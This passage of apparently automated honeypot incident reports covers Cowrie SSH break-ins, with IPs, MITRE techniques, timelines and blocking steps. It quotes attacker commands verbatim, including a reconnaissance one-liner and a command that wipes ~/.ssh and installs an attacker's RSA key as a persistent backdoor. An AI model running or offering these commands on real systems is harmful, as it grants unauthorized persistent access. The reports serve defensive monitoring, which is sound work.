| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:38 |
| **Last Seen** | 2026-07-26 07:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:38:37` | `cowrie.session.connect` |
| `2026-07-26 07:38:37` | `cowrie.client.version` |
| `2026-07-26 07:38:37` | `cowrie.client.kex` |
| `2026-07-26 07:38:39` | `cowrie.login.success` |
| `2026-07-26 07:38:40` | `cowrie.session.params` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.success` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:40` | `cowrie.command.input` |
| `2026-07-26 07:38:41` | `cowrie.log.closed` |
| `2026-07-26 07:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcd5c0c64440

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:40 |
| **Last Seen** | 2026-07-26 07:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:40:23` | `cowrie.session.connect` |
| `2026-07-26 07:40:23` | `cowrie.client.version` |
| `2026-07-26 07:40:23` | `cowrie.client.kex` |
| `2026-07-26 07:40:25` | `cowrie.login.success` |
| `2026-07-26 07:40:27` | `cowrie.session.params` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.success` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.command.input` |
| `2026-07-26 07:40:27` | `cowrie.log.closed` |
| `2026-07-26 07:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d8b71b7b49

| Field | Detail |
|---|---|
| **Source IP** | `165.101.250[.]39` |
| **First Seen** | 2026-07-26 07:40 |
| **Last Seen** | 2026-07-26 07:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:40:53` | `cowrie.session.connect` |
| `2026-07-26 07:40:53` | `cowrie.client.version` |
| `2026-07-26 07:40:53` | `cowrie.client.kex` |
| `2026-07-26 07:40:54` | `cowrie.login.success` |
| `2026-07-26 07:40:55` | `cowrie.session.params` |
| `2026-07-26 07:40:55` | `cowrie.command.input` |
| `2026-07-26 07:40:55` | `cowrie.command.failed` |
| `2026-07-26 07:40:56` | `cowrie.log.closed` |
| `2026-07-26 07:40:56` | `cowrie.session.params` |
| `2026-07-26 07:40:56` | `cowrie.command.input` |
| `2026-07-26 07:40:57` | `cowrie.session.file_download` |
| `2026-07-26 07:40:57` | `cowrie.log.closed` |
| `2026-07-26 07:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.101.250[.]39` to AbuseIPDB if not already reported
- [ ] Block `165.101.250[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-242e2dec6d25

| Field | Detail |
|---|---|
| **Source IP** | `165.101.250[.]39` |
| **First Seen** | 2026-07-26 07:40 |
| **Last Seen** | 2026-07-26 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:40:57` | `cowrie.session.connect` |
| `2026-07-26 07:40:57` | `cowrie.client.version` |
| `2026-07-26 07:40:57` | `cowrie.client.kex` |
| `2026-07-26 07:40:58` | `cowrie.login.success` |
| `2026-07-26 07:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.101.250[.]39` to AbuseIPDB if not already reported
- [ ] Block `165.101.250[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86fb6d35382b

| Field | Detail |
|---|---|
| **Source IP** | `165.101.250[.]39` |
| **First Seen** | 2026-07-26 07:40 |
| **Last Seen** | 2026-07-26 07:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:40:59` | `cowrie.session.connect` |
| `2026-07-26 07:40:59` | `cowrie.client.version` |
| `2026-07-26 07:40:59` | `cowrie.client.kex` |
| `2026-07-26 07:41:00` | `cowrie.login.success` |
| `2026-07-26 07:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.101.250[.]39` to AbuseIPDB if not already reported
- [ ] Block `165.101.250[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-811c813ae0d0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:42 |
| **Last Seen** | 2026-07-26 07:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:42:10` | `cowrie.session.connect` |
| `2026-07-26 07:42:10` | `cowrie.client.version` |
| `2026-07-26 07:42:10` | `cowrie.client.kex` |
| `2026-07-26 07:42:12` | `cowrie.login.success` |
| `2026-07-26 07:42:13` | `cowrie.session.params` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.success` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:13` | `cowrie.command.input` |
| `2026-07-26 07:42:14` | `cowrie.log.closed` |
| `2026-07-26 07:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ebc879d85c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:43 |
| **Last Seen** | 2026-07-26 07:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:43:52` | `cowrie.session.connect` |
| `2026-07-26 07:43:53` | `cowrie.client.version` |
| `2026-07-26 07:43:53` | `cowrie.client.kex` |
| `2026-07-26 07:43:54` | `cowrie.login.success` |
| `2026-07-26 07:43:55` | `cowrie.session.params` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.success` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.command.input` |
| `2026-07-26 07:43:56` | `cowrie.log.closed` |
| `2026-07-26 07:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c6c0c220f37

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:45 |
| **Last Seen** | 2026-07-26 07:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:45:35` | `cowrie.session.connect` |
| `2026-07-26 07:45:36` | `cowrie.client.version` |
| `2026-07-26 07:45:36` | `cowrie.client.kex` |
| `2026-07-26 07:45:37` | `cowrie.login.success` |
| `2026-07-26 07:45:38` | `cowrie.session.params` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.success` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:38` | `cowrie.command.input` |
| `2026-07-26 07:45:39` | `cowrie.log.closed` |
| `2026-07-26 07:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ce64d470b96

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-26 07:45 |
| **Last Seen** | 2026-07-26 07:46 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:45:55` | `cowrie.session.connect` |
| `2026-07-26 07:45:55` | `cowrie.client.version` |
| `2026-07-26 07:45:56` | `cowrie.client.kex` |
| `2026-07-26 07:45:56` | `cowrie.login.success` |
| `2026-07-26 07:45:57` | `cowrie.session.params` |
| `2026-07-26 07:45:57` | `cowrie.command.input` |
| `2026-07-26 07:45:57` | `cowrie.command.failed` |
| `2026-07-26 07:45:57` | `cowrie.log.closed` |
| `2026-07-26 07:45:58` | `cowrie.session.params` |
| `2026-07-26 07:45:58` | `cowrie.command.input` |
| `2026-07-26 07:45:58` | `cowrie.session.file_download` |
| `2026-07-26 07:45:58` | `cowrie.log.closed` |
| `2026-07-26 07:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ed52b14b846

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-26 07:45 |
| **Last Seen** | 2026-07-26 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:45:58` | `cowrie.session.connect` |
| `2026-07-26 07:45:58` | `cowrie.client.version` |
| `2026-07-26 07:45:58` | `cowrie.client.kex` |
| `2026-07-26 07:45:59` | `cowrie.login.success` |
| `2026-07-26 07:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1639a976f91a

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-26 07:46 |
| **Last Seen** | 2026-07-26 07:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:46:00` | `cowrie.session.connect` |
| `2026-07-26 07:46:00` | `cowrie.client.version` |
| `2026-07-26 07:46:00` | `cowrie.client.kex` |
| `2026-07-26 07:46:01` | `cowrie.login.success` |
| `2026-07-26 07:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a5530c29a3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:47 |
| **Last Seen** | 2026-07-26 07:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:47:22` | `cowrie.session.connect` |
| `2026-07-26 07:47:22` | `cowrie.client.version` |
| `2026-07-26 07:47:22` | `cowrie.client.kex` |
| `2026-07-26 07:47:23` | `cowrie.login.success` |
| `2026-07-26 07:47:25` | `cowrie.session.params` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.success` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.command.input` |
| `2026-07-26 07:47:25` | `cowrie.log.closed` |
| `2026-07-26 07:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a65e930a03e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:49 |
| **Last Seen** | 2026-07-26 07:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:49:09` | `cowrie.session.connect` |
| `2026-07-26 07:49:09` | `cowrie.client.version` |
| `2026-07-26 07:49:09` | `cowrie.client.kex` |
| `2026-07-26 07:49:11` | `cowrie.login.success` |
| `2026-07-26 07:49:12` | `cowrie.session.params` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.success` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.command.input` |
| `2026-07-26 07:49:12` | `cowrie.log.closed` |
| `2026-07-26 07:49:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbd86f9a7ab6

| Field | Detail |
|---|---|
| **Source IP** | `202.82.20[.]241` |
| **First Seen** | 2026-07-26 07:49 |
| **Last Seen** | 2026-07-26 07:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:49:12` | `cowrie.session.connect` |
| `2026-07-26 07:49:13` | `cowrie.client.version` |
| `2026-07-26 07:49:13` | `cowrie.client.kex` |
| `2026-07-26 07:49:15` | `cowrie.login.success` |
| `2026-07-26 07:49:15` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:49:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.82.20[.]241` to AbuseIPDB if not already reported
- [ ] Block `202.82.20[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d485b159a1a3

| Field | Detail |
|---|---|
| **Source IP** | `27.128.162[.]146` |
| **First Seen** | 2026-07-26 07:50 |
| **Last Seen** | 2026-07-26 07:50 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:50:13` | `cowrie.session.connect` |
| `2026-07-26 07:50:14` | `cowrie.client.version` |
| `2026-07-26 07:50:14` | `cowrie.client.kex` |
| `2026-07-26 07:50:17` | `cowrie.login.success` |
| `2026-07-26 07:50:17` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.162[.]146` to AbuseIPDB if not already reported
- [ ] Block `27.128.162[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d0cf308e53

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:50 |
| **Last Seen** | 2026-07-26 07:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:50:55` | `cowrie.session.connect` |
| `2026-07-26 07:50:55` | `cowrie.client.version` |
| `2026-07-26 07:50:55` | `cowrie.client.kex` |
| `2026-07-26 07:50:57` | `cowrie.login.success` |
| `2026-07-26 07:50:58` | `cowrie.session.params` |
